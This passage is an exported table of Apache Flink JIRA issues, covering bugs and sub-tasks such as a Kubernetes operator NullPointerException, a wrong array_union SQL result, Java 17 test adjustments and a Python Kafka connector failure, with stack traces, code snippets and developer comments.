<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Duplicate,,snazarov,snazarov,14/Jun/23 14:37,15/Jun/23 11:40,04/Jun/24 20:41,15/Jun/23 11:40,kubernetes-operator-1.5.0,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"Prerequisites:
 * Deployment via Apache Flink Kubernetes operator with version 1.5.0
 * Deployment using FlinkDeployment spec
 * Upgrade mode - savepoint
 * Configuration property ""kubernetes.operator.job.upgrade.last-state-fallback.enabled"" is true
 * Flink version 1.15.4

 

Steps to reproduce:
 # Deploy an app
 # You can wait till the app creates a checkpoint (it doesn't change anything even if ""kubernetes.operator.job.upgrade.last-state-fallback.enabled"" is true)
 # Deploy a new version of the app with an error that causes throwing an exception from the main method of the app

Exception which causes operator NPE
{code:none}
36mo.a.f.k.o.o.JobStatusObserver [m [1;31m[ERROR][flink-apps/myApp] Job 0d78a62fe581b047510e28f26393a7ce failed with error: org.apache.flink.client.program.ProgramInvocationException: The main method caused an error: Consumer does not exist
	at org.apache.flink.client.program.PackagedProgram.callMainMethod(PackagedProgram.java:372)
	at org.apache.flink.client.program.PackagedProgram.invokeInteractiveModeForExecution(PackagedProgram.java:222)
	at org.apache.flink.client.ClientUtils.executeProgram(ClientUtils.java:114)
	at org.apache.flink.client.deployment.application.ApplicationDispatcherBootstrap.runApplicationEntryPoint(ApplicationDispatcherBootstrap.java:291)
	at org.apache.flink.client.deployment.application.ApplicationDispatcherBootstrap.lambda$runApplicationAsync$2(ApplicationDispatcherBootstrap.java:244)
	at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Unknown Source)
	at java.base/java.util.concurrent.FutureTask.run(Unknown Source)
	at org.apache.flink.runtime.concurrent.akka.ActorSystemScheduledExecutorAdapter$ScheduledFutureTask.run(ActorSystemScheduledExecutorAdapter.java:171)
	at org.apache.flink.runtime.concurrent.akka.ClassLoadingUtils.runWithContextClassLoader(ClassLoadingUtils.java:68)
	at org.apache.flink.runtime.concurrent.akka.ClassLoadingUtils.lambda$withContextClassLoader$0(ClassLoadingUtils.java:41)
	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:49)
	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:48)
	at java.base/java.util.concurrent.ForkJoinTask.doExec(Unknown Source)
	at java.base/java.util.concurrent.ForkJoinPool$WorkQueue.topLevelExec(Unknown Source)
	at java.base/java.util.concurrent.ForkJoinPool.scan(Unknown Source)
	at java.base/java.util.concurrent.ForkJoinPool.runWorker(Unknown Source)
	at java.base/java.util.concurrent.ForkJoinWorkerThread.run(Unknown Source)
{code}
NPE in K8s operator
{code:none}
[36mo.a.f.k.o.l.AuditUtils        [m [32m[INFO ][flink-apps/myApp] >>> Event  | Info    | JOBSTATUSCHANGED | Job status changed from RECONCILING to FAILED
[36mo.a.f.k.o.o.SavepointObserver [m [1;31m[ERROR][flink-apps/myApp] Could not observe latest savepoint information.
java.lang.NullPointerException
	at org.apache.flink.kubernetes.operator.service.CheckpointHistoryWrapper.getInProgressCheckpoint(CheckpointHistoryWrapper.java:60)
	at org.apache.flink.kubernetes.operator.service.AbstractFlinkService.getCheckpointInfo(AbstractFlinkService.java:564)
	at org.apache.flink.kubernetes.operator.service.AbstractFlinkService.getLastCheckpoint(AbstractFlinkService.java:520)
	at org.apache.flink.kubernetes.operator.observer.SavepointObserver.observeLatestSavepoint(SavepointObserver.java:209)
	at org.apache.flink.kubernetes.operator.observer.SavepointObserver.observeSavepointStatus(SavepointObserver.java:73)
	at org.apache.flink.kubernetes.operator.observer.deployment.ApplicationObserver.observeFlinkCluster(ApplicationObserver.java:61)
	at org.apache.flink.kubernetes.operator.observer.deployment.AbstractFlinkDeploymentObserver.observeInternal(AbstractFlinkDeploymentObserver.java:73)
	at org.apache.flink.kubernetes.operator.observer.AbstractFlinkResourceObserver.observe(AbstractFlinkResourceObserver.java:53)
	at org.apache.flink.kubernetes.operator.controller.FlinkDeploymentController.reconcile(FlinkDeploymentController.java:134)
	at org.apache.flink.kubernetes.operator.controller.FlinkDeploymentController.reconcile(FlinkDeploymentController.java:57)
	at io.javaoperatorsdk.operator.processing.Controller$1.execute(Controller.java:138)
	at io.javaoperatorsdk.operator.processing.Controller$1.execute(Controller.java:96)
	at org.apache.flink.kubernetes.operator.metrics.OperatorJosdkMetrics.timeControllerExecution(OperatorJosdkMetrics.java:80)
	at io.javaoperatorsdk.operator.processing.Controller.reconcile(Controller.java:95)
	at io.javaoperatorsdk.operator.processing.event.ReconciliationDispatcher.reconcileExecution(ReconciliationDispatcher.java:139)
	at io.javaoperatorsdk.operator.processing.event.ReconciliationDispatcher.handleReconcile(ReconciliationDispatcher.java:119)
	at io.javaoperatorsdk.operator.processing.event.ReconciliationDispatcher.handleDispatch(ReconciliationDispatcher.java:89)
	at io.javaoperatorsdk.operator.processing.event.ReconciliationDispatcher.handleExecution(ReconciliationDispatcher.java:62)
	at io.javaoperatorsdk.operator.processing.event.EventProcessor$ReconcilerExecutor.run(EventProcessor.java:414)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
	at java.base/java.lang.Thread.run(Unknown Source)
{code}
What it brakes
1. The operator loses the latest savepoint/checkpoint information so you cannot deploy a new version of the app with a fix. To workaround it you should entirely delete the current deployment, manually find the latest checkpoint by job ID in S3 or other checkpoint storages and create a new deployment with initialSavepointPath which you manually have found.
2. The operator stuck deleting the app when the app is deleted by the command
{noformat}
kubectl delete flinkdeployment <deployment name>{noformat}
To workaround it you need to find and delete the K8s Deployment resource
{noformat}
kubectl delete deployment <deployment name>{noformat}
3. When the feature ""kubernetes.operator.deployment.rollback.enabled"" is enabled operator doesn't rollback app to a previously deployed version",,,,,,,,,,,,,,,,,,,,FLINK-32111,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 11:40:37 UTC 2023,,,,,,,,,,"0|z1ijxc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 11:40;gyfora;This is fixed already in FLINK-32111;;;",,,,,,,,,,,,,,,,,,,,,,
Align lock usage in DefaultLeaderElectionService,FLINK-32339,13540038,13542119,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,mapohl,mapohl,14/Jun/23 11:33,03/Jul/23 13:41,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,,,,"{{DefaultLeaderElectionService}} uses sequential execution through a single thread executor for the leader event handling (introduced in FLINK-31838). We missed moving the leadership confirmation event into that queue.

This issue came up in a [PR comment|https://github.com/apache/flink/pull/22769#pullrequestreview-1478763256].",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 14 11:37:17 UTC 2023,,,,,,,,,,"0|z1ijs8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jun/23 11:37;mapohl;But I'm still not 100% sure whether it will help: The event handling is, indeed, not implemented consistently (with the leadership confirmation not being handled in the leader event operation thread). But we need the lock anyway to confirm that service isn't closed (by accessing the {{running}} field) within the lock.;;;",,,,,,,,,,,,,,,,,,,,,,
Add FailsOnJava17 annotation,FLINK-32338,13540036,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,14/Jun/23 11:18,15/Jun/23 15:24,04/Jun/24 20:41,15/Jun/23 15:24,,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,"Add an annotation for disabling specific tests on Java 17, similar to FailsOnJava11.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 15:24:18 UTC 2023,,,,,,,,,,"0|z1ijrs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 15:24;chesnay;master: d2e4490ca11443de071869877319f459e43821e5;;;",,,,,,,,,,,,,,,,,,,,,,
SQL array_union could return wrong result,FLINK-32337,13540035,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Sergey Nuyanzin,Sergey Nuyanzin,Sergey Nuyanzin,14/Jun/23 11:11,15/Jun/23 22:43,04/Jun/24 20:41,15/Jun/23 22:39,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,pull-request-available,,,"This is was mentioned at [https://github.com/apache/flink/pull/22717#issuecomment-1587333488]

 how to reproduce
{code:sql}
SELECT array_union(ARRAY[CAST(NULL AS INT)], ARRAY[1]); -- returns [NULL, 1], this is OK
SELECT array_union(ARRAY[1], ARRAY[CAST(NULL AS INT)]); -- returns [1, 0], this is NOT OK
{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 22:39:07 UTC 2023,,,,,,,,,,"0|z1ijrk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 22:39;Sergey Nuyanzin;Merged as [9bcebe7db3abfae6474e9dc4f1180bc5b63f2a75|https://github.com/apache/flink/commit/9bcebe7db3abfae6474e9dc4f1180bc5b63f2a75];;;",,,,,,,,,,,,,,,,,,,,,,
PartitionITCase#ComparablePojo should be public,FLINK-32336,13540030,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,14/Jun/23 10:56,15/Jun/23 10:51,04/Jun/24 20:41,15/Jun/23 10:51,,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,"POJOs should be public, but this one is private forcing it go through Kryo, which is currently failing for some odd reason.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 10:51:31 UTC 2023,,,,,,,,,,"0|z1ijqg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 10:51;chesnay;master: 6df09d833ca71302d7f5d2cbac7601a207cc1bb7;;;",,,,,,,,,,,,,,,,,,,,,,
Fix the Flink ML unittest failure,FLINK-32335,13540012,,New Feature,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Jiang Xin,Jiang Xin,Jiang Xin,14/Jun/23 08:48,14/Jul/23 04:34,04/Jun/24 20:41,14/Jul/23 04:34,,,,,,,,,,,,,,,ml-2.4.0,,,,,,Library / Machine Learning,,,,0,pull-request-available,,,"The [github CI](https://github.com/apache/flink-ml/actions/runs/5227269169/jobs/9438737620) of Flink ML failed because of the following exception.

 
{code:java}
E                   Caused by: java.util.ConcurrentModificationException
223E                   	at java.util.ArrayDeque$DeqIterator.next(ArrayDeque.java:648)
224E                   	at java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1044)
225E                   	at org.apache.flink.iteration.operator.HeadOperator.parseInputChannelEvents(HeadOperator.java:464)
226E                   	at org.apache.flink.iteration.operator.HeadOperator.endInput(HeadOperator.java:392)
227E                   	at org.apache.flink.streaming.runtime.tasks.StreamOperatorWrapper.endOperatorInput(StreamOperatorWrapper.java:96)
228E                   	at org.apache.flink.streaming.runtime.tasks.RegularOperatorChain.endInput(RegularOperatorChain.java:97)
229E                   	at org.apache.flink.streaming.runtime.io.StreamOneInputProcessor.processInput(StreamOneInputProcessor.java:68)
230E                   	at org.apache.flink.streaming.runtime.tasks.StreamTask.processInput(StreamTask.java:550)
231E                   	at org.apache.flink.streaming.runtime.tasks.mailbox.MailboxProcessor.runMailboxLoop(MailboxProcessor.java:231)
232E                   	at org.apache.flink.streaming.runtime.tasks.StreamTask.runMailboxLoop(StreamTask.java:839)
233E                   	at org.apache.flink.streaming.runtime.tasks.StreamTask.invoke(StreamTask.java:788)
234E                   	at org.apache.flink.runtime.taskmanager.Task.runWithSystemExitMonitoring(Task.java:952)
235E                   	at org.apache.flink.runtime.taskmanager.Task.restoreAndInvoke(Task.java:931)
236E                   	at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:745)
237E                   	at org.apache.flink.runtime.taskmanager.Task.run(Task.java:562)
238E                   	at java.lang.Thread.run(Thread.java:750){code}
 

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 14 04:34:02 UTC 2023,,,,,,,,,,"0|z1ijmg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jul/23 04:34;lindong;Merged to apache/flink-ml master branch 892fb4714c6f7e7055f26b4a2d1e1b36094500be;;;",,,,,,,,,,,,,,,,,,,,,,
Operator failed to create taskmanager deployment because it already exist,FLINK-32334,13540002,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,nfraison.datadog,nfraison.datadog,nfraison.datadog,14/Jun/23 07:57,19/Jun/23 09:58,04/Jun/24 20:41,19/Jun/23 09:58,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,"During a job upgrade the operator has failed to start the new job because it has failed to create the taskmanager deployment:

 
{code:java}
Jun 12 19:45:28.115 >>> Status | Error | UPGRADING | {""type"":""org.apache.flink.kubernetes.operator.exception.ReconciliationException"",""message"":""org.apache.flink.client.deployment.ClusterDeploymentException: Could not create Kubernetes cluster \""flink-metering\""."",""throwableList"":[{""type"":""org.apache.flink.client.deployment.ClusterDeploymentException"",""message"":""Could not create Kubernetes cluster \""flink-metering\"".""},{""type"":""org.apache.flink.kubernetes.shaded.io.fabric8.kubernetes.client.KubernetesClientException"",""message"":""Failure executing: POST at: https://10.129.144.1/apis/apps/v1/namespaces/metering/deployments. Message: object is being deleted: deployments.apps \""flink-metering-taskmanager\"" already exists. Received status: Status(apiVersion=v1, code=409, details=StatusDetails(causes=[], group=apps, kind=deployments, name=flink-metering-taskmanager, retryAfterSeconds=null, uid=null, additionalProperties={}), kind=Status, message=object is being deleted: deployments.apps \""flink-metering-taskmanager\"" already exists, metadata=ListMeta(_continue=null, remainingItemCount=null, resourceVersion=null, selfLink=null, additionalProperties={}), reason=AlreadyExists, status=Failure, additionalProperties={}).""}]} {code}
As indicated in the error log this is due to taskmanger deployment still existing while it is under deletion.

Looking at the [source code|https://github.com/apache/flink-kubernetes-operator/blob/main/flink-kubernetes-operator/src/main/java/org/apache/flink/kubernetes/operator/service/StandaloneFlinkService.java#L150] we are well relying on FOREGROUND policy by default.

Still it seems that the REST API call to delete only wait until the resource has been modified and the {{deletionTimestamp}} has been added to the metadata: [ensure delete returns only when the delete operation is fully finished -  Issue #3246 -  fabric8io/kubernetes-client|https://github.com/fabric8io/kubernetes-client/issues/3246#issuecomment-874019899]

So we could face this issue if the k8s cluster is slow to ""really"" delete the deployment

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 19 09:58:35 UTC 2023,,,,,,,,,,"0|z1ijk8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jun/23 08:04;nfraison.datadog;Adding a check that object has been well deleted should be enough for this issue
{code:java}
kubernetesClient
        .apps()
        .deployments()
        .inNamespace(namespace)
        .withName(StandaloneKubernetesUtils.getTaskManagerDeploymentName(clusterId))
        .waitUntilCondition(Objects::isNull, 30, TimeUnit.SECONDS); {code};;;","14/Jun/23 09:29;gyfora;We should not add waiting unnecessarily to all deletions, because we simply don't need to wait in most cases synchronously. 
There is a waitForClusterShutdown(...) in the flink service that is called when we actually need to wait. Maybe the implementation doesn't work correctly for standalone clusters.;;;","14/Jun/23 09:45;nfraison.datadog;I can see in the log that we have wait once and then ""found"" the cluster to be shutdown
{code:java}
Jun 12 19:45:25.133 for cluster shutdown...
Jun 12 19:45:27.192 shutdown completed. {code}
I think the issue is due to the fact that we only look for JM pods not for TM one

I will see to add a check for the TM in it (and only for standalone clusters);;;","19/Jun/23 09:58;gyfora;merged to main 4d9615f5c76672c9b324ed8f4876d62af7fef60e;;;",,,,,,,,,,,,,,,,,,,
"The same SQL statement, sql-client and sql-gateway give different execution plans",FLINK-32333,13539963,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,macdoor615,macdoor615,14/Jun/23 05:11,14/Jun/23 05:11,04/Jun/24 20:41,,1.17.1,,,,,,,,,,,,,,,,,,,,Table SQL / Client,Table SQL / Gateway,,,0,,,,"We have a SQL job, like this
select ... from prod_kafka.f_alarm_tag_dev /*+ OPTIONS('scan.startup.mode' = 'latest-offset') */ as f 
left join mysql_bnpmp.gem_bnpmp.f_a_alarm_filter
 /*+ OPTIONS('lookup.cache.max-rows' = '5000', 'lookup.cache.ttl' = '30s') */
FOR SYSTEM_TIME AS OF f.proctime ff  on ff.rule_type = 0 and f.ne_ip = ff.ip 
We submit to flink 1.17.1 cluster with {*}sql-gateway{*}. We found that the execution plan ignores the filter condition (rule_type=0),  and we could not get the expected query results
{code:java}
   +- [1196]:LookupJoin(table=[mysql_bnpmp.gem_bnpmp.f_a_alarm_filter], joinType=[LeftOuterJoin], lookup=[ip=ne_ip], select=[event_id, severity{code}
We submit same sql to flink 1.17.1 cluster with {*}sql-client{*}. We found that the execution plan contains the filter condition ( lookup=[rule_type=0, ip=ne_ip], where=[(rule_type = 0)] ), and we got the expected query results
{code}
   +- [3]:LookupJoin(table=[mysql_bnpmp.gem_bnpmp.f_a_alarm_filter], joinType=[LeftOuterJoin], lookup=[rule_type=0, ip=ne_ip], where=[(rule_type = 0)], select=[event_id, severity,{code}
We think this issue is related to https://issues.apache.org/jira/browse/FLINK-32321",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-14 05:11:01.0,,,,,,,,,,"0|z1ijbk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Jar files for catalog function are not listed correctly,FLINK-32332,13539951,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Won't Fix,,zjureel,zjureel,14/Jun/23 02:02,19/Jun/23 04:02,04/Jun/24 20:41,19/Jun/23 04:02,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / Gateway,,,,0,pull-request-available,,,"`SHOW JARS` statement will list all jar files in the catalog, but the jar files for catalog function will not be listed before it is used in the specific session of gateway",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 19 04:01:22 UTC 2023,,,,,,,,,,"0|z1ij8w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 08:10;jark;[~zjureel], currently, the SHOW JARS are used to display the added jars by ADD JAR statements. So it is expected not list jar files in catalog functions.  https://nightlies.apache.org/flink/flink-docs-master/docs/dev/table/sql/jar/#show-jars;;;","19/Jun/23 04:01;zjureel;Thanks [~jark] to clear this. If so, I will close this issue and the `show jars` problem can be fixed in https://issues.apache.org/jira/browse/FLINK-32309 cc [~fsk119];;;",,,,,,,,,,,,,,,,,,,,,
Print JVM thread dumps when Github Actions workflow gets cancelled/times out,FLINK-32331,13539919,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,martijnvisser,martijnvisser,martijnvisser,13/Jun/23 18:11,14/Jun/23 13:32,04/Jun/24 20:41,14/Jun/23 13:32,,,,,,,,,,,,,,,,,,,,,Build System / CI,Connectors / Common,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 14 13:32:41 UTC 2023,,,,,,,,,,"0|z1ij1s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jun/23 13:32;martijnvisser;Fixed in apache/flink-connector-shared-utils@ci_utils: 445fc790fb1641dc3d589300fca1133fb176127f;;;",,,,,,,,,,,,,,,,,,,,,,
Install Java 17 in e2e builds,FLINK-32330,13539894,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Not A Problem,chesnay,chesnay,chesnay,13/Jun/23 14:53,13/Jun/23 17:08,04/Jun/24 20:41,13/Jun/23 17:08,,,,,,,,,,,,,,,,,,,,,Test Infrastructure,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 17:08:36 UTC 2023,,,,,,,,,,"0|z1iiw8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 17:08;chesnay;Turns out the Azure ubuntu images come pre-installed with Java 17.;;;",,,,,,,,,,,,,,,,,,,,,,
Do not overwrite env.java.opts.all in HA e2e test,FLINK-32329,13539893,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,13/Jun/23 14:51,14/Jun/23 07:35,04/Jun/24 20:41,14/Jun/23 07:35,,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,"Avoid overriding env.java.opts.all since it will soon contain the module declarations required for running Java 17.

This is a bit of a hack; a nicer approach would be to append to the existing value, but ain't no one got time to deal with bash.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 14 07:35:15 UTC 2023,,,,,,,,,,"0|z1iiw0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jun/23 07:35;chesnay;master: c5334bc222c4a2ad28ca91ad69aaf5bf4c71d5aa;;;",,,,,,,,,,,,,,,,,,,,,,
Ensure surefire baseLine is picked up by IntelliJ,FLINK-32328,13539886,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,13/Jun/23 14:39,13/Jun/23 17:37,04/Jun/24 20:41,13/Jun/23 17:37,,,,,,,,,,,,,,,1.18.0,,,,,,Build System,,,,0,pull-request-available,,,"We currently configure JVM arguments exclusively within the surefire executions, which IntelliJ doesn't read. We should also set the baseArgsLine (which in the future will contain module declarations) to the base surefire configuration.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 17:37:22 UTC 2023,,,,,,,,,,"0|z1iiug:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 17:37;chesnay;master: 5fe0a506d598831376aefa75f900f2c59b6343b5;;;",,,,,,,,,,,,,,,,,,,,,,
Python Kafka connector runs into strange NullPointerException,FLINK-32327,13539885,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,dianfu,chesnay,chesnay,13/Jun/23 14:36,06/Jul/23 09:09,04/Jun/24 20:41,04/Jul/23 14:41,,,,,,,,,,,,,,,1.18.0,,,,,,API / Python,,,,0,pull-request-available,,,"The following error occurs when running the python kafka tests:
(this uses a slightly modified version of the code, but the error also happens without it)

{code:python}
     def set_record_serializer(self, record_serializer: 'KafkaRecordSerializationSchema') \
             -> 'KafkaSinkBuilder':
         """"""
         Sets the :class:`KafkaRecordSerializationSchema` that transforms incoming records to kafka
         producer records.
     
         :param record_serializer: The :class:`KafkaRecordSerializationSchema`.
         """"""
         # NOTE: If topic selector is a generated first-column selector, do extra preprocessing
         j_topic_selector = get_field_value(record_serializer._j_serialization_schema,
                                            'topicSelector')
     
         caching_name_suffix = 'KafkaRecordSerializationSchemaBuilder.CachingTopicSelector'
         if j_topic_selector.getClass().getCanonicalName().endswith(caching_name_suffix):
             class_name = get_field_value(j_topic_selector, 'topicSelector')\
                 .getClass().getCanonicalName()
 >           if class_name.startswith('com.sun.proxy') or class_name.startswith('jdk.proxy'):
 E           AttributeError: 'NoneType' object has no attribute 'startswith'
{code}

My assumption is that {{getCanonicalName}} returns {{null}} for some objects, and this set of objects may have increased in Java 17. I tried adding a null check, but that caused other tests to fail.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 06 09:09:05 UTC 2023,,,,,,,,,,"0|z1iiu8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 19:52;chesnay;Python tests have been disabled for JDK 17 builds.
master: d11266ee10230c4602e2abd9d79eea40a870adb3;;;","17/Jun/23 10:11;dianfu;[~chesnay] It seems that you have disabled the entire Python tests for Java 17. Have you seen other failing tests on Java 17 for Python?;;;","17/Jun/23 10:12;dianfu;PS: I can help to dig into this problem if we know which ones are failing.;;;","27/Jun/23 16:48;chesnay;Only the kafka python tests are failing.

{code}
Jun 15 12:16:11 =========================== short test summary info ============================
Jun 15 12:16:11 FAILED pyflink/datastream/connectors/tests/test_kafka.py::KafkaSinkTests::test_compile
Jun 15 12:16:11 FAILED pyflink/datastream/connectors/tests/test_kafka.py::KafkaSinkTests::test_set_bootstrap_severs
Jun 15 12:16:11 FAILED pyflink/datastream/connectors/tests/test_kafka.py::KafkaSinkTests::test_set_delivery_guarantee
Jun 15 12:16:11 FAILED pyflink/datastream/connectors/tests/test_kafka.py::KafkaSinkTests::test_set_property
Jun 15 12:16:11 FAILED pyflink/datastream/connectors/tests/test_kafka.py::KafkaSinkTests::test_set_record_serializer
Jun 15 12:16:11 FAILED pyflink/datastream/connectors/tests/test_kafka.py::KafkaSinkTests::test_set_transactional_id_prefix
Jun 15 12:16:11 FAILED pyflink/datastream/connectors/tests/test_kafka.py::KafkaRecordSerializationSchemaTests::test_set_topic_selector
{code}

Here's one of my builds where it failed: https://dev.azure.com/chesnay/flink/_build/results?buildId=3620&view=results;;;","29/Jun/23 11:48;dianfu;Thanks (y). I will find some time to investigate this issue next week.;;;","04/Jul/23 14:41;dianfu;Fixed in master via 940cb746b91d5022f52c49d4e8e09e15ffea4709;;;","06/Jul/23 09:09;chesnay;Tests re-enabled in 9b8a01cdffde5c2c3022952d6519d047c508c5e8.;;;",,,,,,,,,,,,,,,,
Disable WAL in RocksDBWriteBatchWrapper by default,FLINK-32326,13539846,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
